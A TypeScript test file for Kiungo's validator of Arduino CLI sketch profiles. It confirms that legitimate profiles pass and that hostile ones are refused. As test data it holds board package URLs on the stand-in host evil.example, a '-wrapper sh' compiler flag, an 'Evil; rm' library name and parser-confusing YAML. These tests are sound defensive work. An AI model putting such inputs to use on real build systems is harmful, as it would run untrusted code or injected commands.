// @vitest-environment node
import { describe, expect, it } from "vitest";
import { checkSketchProfile } from "../src/build";
import { PROJECT_BOARDS, sketchProfile } from "../src/project";

const lines = (...l: string[]) => [...l, ""].join("\n");
const refused = (yaml: string) => {
  const check = checkSketchProfile(yaml);
  expect(check.ok).toBe(false);
  return check.ok ? "" : check.message;
};

const UNO = lines("profiles:", "  kiungo:", "    fqbn: arduino:avr:uno", "    platforms:", "      - platform: arduino:avr (1.8.6)");

describe("the build settings Kiungo builds with (security audit)", () => {
  it("takes every profile Kiungo writes, with and without libraries", () => {
    for (const board of PROJECT_BOARDS) {
      expect(checkSketchProfile(sketchProfile(board)).ok).toBe(true);
      const check = checkSketchProfile(sketchProfile(board, [{ name: "DHT sensor library", version: "1.4.7" }, { name: "Adafruit Unified Sensor", version: "1.1.15", dependency: true }]));
      expect(check).toEqual({
        ok: true,
        fqbn: board.fqbn,
        dirs: [],
        libraries: [
          { name: "DHT sensor library", version: "1.4.7", dependency: false },
          { name: "Adafruit Unified Sensor", version: "1.1.15", dependency: true },
        ],
      });
    }
  });

  it("takes the file as Arduino CLI rewrites it: comments, CRLF, a second profile of Kiungo's boards", () => {
    const yaml = [
      "# Written by Kiungo",
      "profiles:",
      "  other:",
      "    fqbn: arduino:avr:nano:cpu=atmega328",
      "    platforms:",
      "      - platform: arduino:avr (1.8.6)",
      "  kiungo:",
      "    fqbn: arduino:avr:mega:cpu=atmega2560",
      "    platforms:",
      "      - platform: arduino:avr (1.8.6)  # the AVR core",
      "    libraries:",
      "      - LiquidCrystal I2C (1.1.2)",
      "default_profile: kiungo",
    ].join("\r\n");
    expect(checkSketchProfile(yaml)).toMatchObject({ ok: true, fqbn: "arduino:avr:mega:cpu=atmega2560", libraries: [{ name: "LiquidCrystal I2C", version: "1.1.2" }] });
  });

  it("a board package that runs someone else's build recipes is refused", () => {
    expect(refused(lines("profiles:", "  kiungo:", "    fqbn: evil:avr:uno", "    platforms:", "      - platform: evil:avr (1.0.0)", "        platform_index_url: https://evil.example/package_index.json"))).toMatch(/board Kiungo doesn't build for/);
    expect(refused(lines("profiles:", "  kiungo:", "    fqbn: arduino:avr:uno", "    platforms:", "      - platform: arduino:avr (1.8.6)", "      - platform: evil:avr (1.0.0)"))).toMatch(/board package Kiungo doesn't use \(evil:avr\)/);
    // A real board package, from somewhere other than its maker.
    expect(refused(lines("profiles:", "  kiungo:", "    fqbn: esp32:esp32:esp32", "    platforms:", "      - platform: esp32:esp32 (3.3.12)", "        platform_index_url: https://evil.example/package_esp32_index.json"))).toMatch(/somewhere other than its maker/);
    expect(refused(lines("profiles:", "  kiungo:", "    fqbn: arduino:avr:uno", "    platforms:", "      - platform: arduino:avr (1.8.6)", "        platform_index_url: http://downloads.arduino.cc/x.json"))).toMatch(/somewhere other than its maker/);
  });

  it("a library from a folder (whose linker flags would run) is refused in a project", () => {
    expect(refused(`${UNO}    libraries:\n      - dir: ../records/lib\n`)).toMatch(/library from a folder/);
    expect(checkSketchProfile(`${UNO}    libraries:\n      - dir: "/opt/kiungo/hybrid/KiungoHybrid"\n`, { allowDirs: true })).toMatchObject({ ok: true, dirs: ["/opt/kiungo/hybrid/KiungoHybrid"] });
    // Install folders can have spaces, # and & in them: inside quotes they're the path, not YAML.
    const odd = "C:\\Users\\Ann & Co #1\\AppData\\Local\\Programs\\Kiungo\\resources\\hybrid\\KiungoHybrid";
    expect(checkSketchProfile(`${UNO}    libraries:\n      - dir: ${JSON.stringify(odd)}  # Kiungo's runtime\n`, { allowDirs: true })).toMatchObject({ ok: true, dirs: [odd] });
  });

  it("any other profile is held to the same rules", () => {
    expect(refused(`${UNO}  other:\n    fqbn: evil:avr:uno\n    platforms:\n      - platform: evil:avr (1.0.0)\n`)).toMatch(/board Kiungo doesn't build for/);
  });

  it("settings Kiungo doesn't use are refused", () => {
    expect(refused(`${UNO}    build_properties:\n      - compiler.cpp.extra_flags=-wrapper sh\n`)).toMatch(/"build_properties"/);
    expect(refused(UNO.replace("profiles:", "default_fqbn: arduino:avr:uno\nprofiles:"))).toMatch(/setting Kiungo doesn't use/);
    expect(refused(lines("profiles:", "  other:", "    fqbn: arduino:avr:uno", "    platforms:", "      - platform: arduino:avr (1.8.6)"))).toMatch(/no "kiungo" profile/);
  });

  it("YAML that Arduino CLI could read differently is refused, not guessed at", () => {
    // Flow style, anchors and aliases, tags, block scalars, documents.
    expect(refused(lines("profiles:", "  kiungo:", "    fqbn: arduino:avr:uno", '    platforms: [{platform: "evil:avr (1.0.0)", platform_index_url: "https://evil.example/i.json"}]'))).toMatch(/YAML Kiungo doesn't write/);
    expect(refused(`${UNO}  other: &evil\n`)).toMatch(/YAML Kiungo doesn't write/);
    expect(refused(`${UNO.replace("arduino:avr:uno", "!!str arduino:avr:uno")}`)).toMatch(/YAML Kiungo doesn't write/);
    expect(refused(`---\n${UNO}`)).toMatch(/YAML Kiungo doesn't write/);
    // A quoted key is the same key to YAML, but not to a line reader.
    expect(refused(UNO.replace("  kiungo:", '  "kiungo":'))).toMatch(/profile Kiungo can't read/);
    // A deeper line continues the value before it.
    expect(refused(UNO.replace("    fqbn: arduino:avr:uno", "    fqbn: arduino:avr:uno\n      evil"))).toMatch(/laid out/);
    expect(refused(UNO.replace("    ", "\t"))).toMatch(/tabs/);
    // The same thing twice: which one wins is up to the parser.
    expect(refused(`${UNO}  kiungo:\n    fqbn: arduino:avr:uno\n`)).toMatch(/twice/);
    expect(refused(UNO.replace("    platforms:", "    fqbn: arduino:avr:mega:cpu=atmega2560\n    platforms:"))).toMatch(/twice/);
    expect(refused(`${UNO}profiles:\n`)).toMatch(/twice/);
  });

  it("library names follow the Arduino registry's rule", () => {
    expect(refused(`${UNO}    libraries:\n      - Evil; rm (1.0.0)\n`)).toMatch(/library Kiungo can't read/);
    expect(refused(`${UNO}    libraries:\n      - Servo (latest)\n`)).toMatch(/library Kiungo can't read/);
  });
});
